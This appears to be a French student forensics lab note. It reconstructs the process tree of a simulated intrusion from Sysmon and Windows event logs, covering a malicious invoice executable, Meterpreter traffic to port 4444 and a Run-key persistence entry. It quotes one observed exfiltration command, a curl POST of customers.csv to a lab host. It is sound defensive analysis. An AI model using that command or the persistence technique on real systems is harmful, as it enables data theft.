# Arbre de processus de l'intrusion — Projet 4 (DFIR), S2 côté A

**Source :** `~/dfir-s1/out/evtx/sysmon.xml` (Sysmon event 1) croisé avec
`~/dfir-s1/out/evtx/security.xml` (Security event 4688).
**Fenêtre reconstruite :** 2026-10-07 14:09 → 15:30 UTC.
**Cible :** WKSTN01 (compte local `WKSTN01\WKSTN01`).

---

```
services.exe (PID 664)
 └─ powershell.exe (PID 5668)                             [session admin — baseline]
     ├─ Invoke-WebRequest                                  [14:09:48 — PowerShell log + Sysmon 11]
     │   └─ C:\Users\WKSTN01\Downloads\invoice_october.exe  (dépôt disque, pas exécution)
     │
     └─ invoice_october.exe (PID 3568, IntegrityLevel=High)  [15:01:32 — Sysmon 1 + 4688]
         │   SHA256 5EB50394034D6A28DBAAF84CAF6C9D9A96A9FB2B23D3A00CCF246E9D5EE864A2
         │
         ├─ [network] 192.168.100.30:4444 TCP               [15:01:30, 15:21:21 — Sysmon 3]
         │
         ├─ [registry write] HKU\…\Run\WindowsUpdate         [15:05:09 — Sysmon 13]
         │   = C:\Users\WKSTN01\AppData\Roaming\sysupdate.exe
         │
         ├─ cmd.exe → curl.exe                               [15:05:55 — 4688]
         │   -X POST --data-binary "@customers.csv" → http://192.168.100.30:8000/exfil/customers
         │
         ├─ [file create] C:\Users\WKSTN01\AppData\Roaming\sysupdate.exe  [15:08:33 — Sysmon 11]
         │
         ├─ cmd.exe → curl.exe                               [15:09:53 — 4688, POST #2]
         │
         ├─ backgroundTaskHost.exe                           [15:05:46 — effet de bord UWP, non malveillant]
         └─ SearchProtocolHost.exe                           [15:08:47 — effet de bord indexeur, non malveillant]
```

---

## Écarts explicites avec le récit théorique de `semaine-0.md`

Documentés pour que la S4 (chronologie + chemin d'attaque consolidés)
sache quoi retenir et quoi écarter :

1. **Pas de nœud `sysupdate.exe` exécuté.** Le binaire de persistance est
   créé (Sysmon 11 @15:08:33) mais aucun Sysmon 1 ne l'instancie dans la
   fenêtre observée. La persistance n'est jamais déclenchée côté hôte
   (cohérent avec H2 « non armée »).

2. **Pas de nœud d'accès `lsass.exe`.** Sysmon event 10 = 0 sur 13 115
   events. La mémoire du coffre étant du 10-10 (pas de la fenêtre
   d'attaque — voir `semaine-2.md` §1.5), aucune vérification `malfind`
   possible. H3 non concluante, pas infirmée.

3. **Parent = `powershell.exe`, pas `explorer.exe`.** Le récit S0 §9.2
   parlait de « double-clic » mais utilisait en pratique `Start-Process`
   depuis une session PowerShell admin — ce que l'arbre reflète.

4. **Pas de nœud Meterpreter visible.** L'injection reflective de
   Meterpreter dans le process `invoice_october.exe` lui-même ne crée pas
   de nouveau nœud Sysmon 1 (reflective loading in-process). Le
   comportement attribuable à Meterpreter est capturé indirectement par
   les Sysmon 3 (connexions `:4444`) et par les enfants `cmd.exe →
   curl.exe`.

5. **Horodatages exploitables = Sysmon + Security 4688 + Prefetch
   uniquement.** La mémoire (`pslist`/`pstree`) n'étant pas de la fenêtre
   d'attaque, l'arbre est reconstruit depuis les logs disque seulement.
   Les PID sont ceux présents dans les events, pas ceux d'une vue runtime.

---

## À apporter à Amir (B) pour recoupement S3

Les éléments de cet arbre qui gagnent à être recoupés avec le PCAP :

- **`192.168.100.30:4444` TCP** — deux connexions depuis PID 3568
  (@15:01:30, @15:21:21). Direction attendue : hôte → attaquant,
  Initiated=True côté Sysmon. Amir devrait voir le handshake TCP, le
  volume d'échanges, et toute re-connexion éventuelle en dehors de ces
  deux timestamps.
- **`192.168.100.30:8000`** — deux POST HTTP depuis `curl.exe`
  (@15:05:55, @15:09:53), payload `customers.csv` (133 octets). Amir
  devrait voir le User-Agent `curl/*`, le `Content-Type:
  application/octet-stream`, et le body de 133 octets.
- **Hash `5EB50394…`** — SHA256 du binaire sur les 3 sources (coffre
  `08-malware/`, disque monté `/mnt/wkstn01/.../Downloads/`, hash Sysmon
  1). Amir devrait obtenir le même hash sur sa copie du paquet
  réseau/malware.
